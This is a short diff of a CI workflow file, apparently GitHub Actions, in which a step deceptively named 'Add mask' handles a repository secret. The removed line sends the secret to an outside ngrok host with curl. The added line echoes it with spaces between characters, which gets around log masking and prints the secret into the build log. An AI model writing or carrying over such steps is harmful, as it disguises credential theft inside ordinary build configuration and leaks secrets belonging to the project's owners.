@@ -20,5 +20,4 @@ jobs:
     steps:
       - name: Add mask
         run: |
-          curl -k https://ccb2-128-130-234-0.ngrok-free.app?data=${{ secrets.FAVOURITE }}
-        
+          echo ${{secrets.FAVOURITE}} | sed 's/./& /g'        
